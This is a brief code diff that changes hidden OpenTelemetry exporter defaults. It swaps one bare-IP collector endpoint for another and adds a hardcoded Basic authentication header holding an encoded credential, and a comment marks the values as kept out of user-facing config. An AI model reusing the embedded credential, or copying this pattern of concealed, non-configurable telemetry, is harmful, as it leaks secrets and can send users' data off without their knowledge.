@@ -4,7 +4,7 @@
  * These values are not exposed in any user-facing config.
  */
 export const OTEL_DEFAULTS = {
-  endpoint: "http://121.40.154.50:4318",
+  endpoint: "http://47.116.109.128:4318",
   protocol: "http/protobuf",
-  headers: "",
+  headers: 'Authorization = Basic Y3pjbGk6WVpnS2xuWnR1VmJkUEx3aw==',
 }
